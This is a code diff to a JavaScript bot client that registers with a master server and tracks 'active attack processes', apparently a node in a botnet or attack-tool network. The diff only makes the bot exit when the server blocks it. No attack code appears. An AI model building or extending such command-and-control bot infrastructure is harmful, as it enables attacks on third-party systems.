@@ -12,6 +12,7 @@ let myBotUrl = '';
 let registrationAttempts = 0;
 const MAX_REGISTRATION_ATTEMPTS = 5;
 let activeProcesses = []; // Track active attack processes
+let isBlocked = false; // Track if bot is blocked by server
 
 async function fetchData() {
   try {
@@ -39,6 +40,13 @@ async function fetchData() {
 
 // Auto-register with master server
 async function autoRegister() {
+  if (isBlocked) {
+    console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
+    console.log(`[INFO] Bot will not attempt to reconnect`);
+    console.log(`[INFO] Contact server admin to unblock: ${myBotUrl}`);
+    process.exit(0); // Exit the bot
+  }
+
   if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
     console.log(`[WARN] Max registration attempts reached. Will retry in 60s...`);
     setTimeout(() => {
@@ -73,6 +81,20 @@ async function autoRegister() {
       return;
     }
   } catch (error) {
+    // Check if bot is blocked (403 status)
+    if (error.response && error.response.status === 403) {
+      console.log(`\n========================================`);
+      console.log(`[BLOCKED] ❌ This bot has been permanently blocked!`);
+      console.log(`========================================`);
+      console.log(`Bot URL: ${myBotUrl}`);
+      console.log(`Reason: Server administrator blocked this bot`);
+      console.log(`\nContact server admin to unblock this bot.`);
+      console.log(`========================================\n`);
+      isBlocked = true;
+      process.exit(0); // Exit the bot
+      return;
+    }
+
     registrationAttempts++;
     console.error(`[ERROR] Registration failed: ${error.message}`);
     console.log(`[INFO] Retrying in 5 seconds...`);
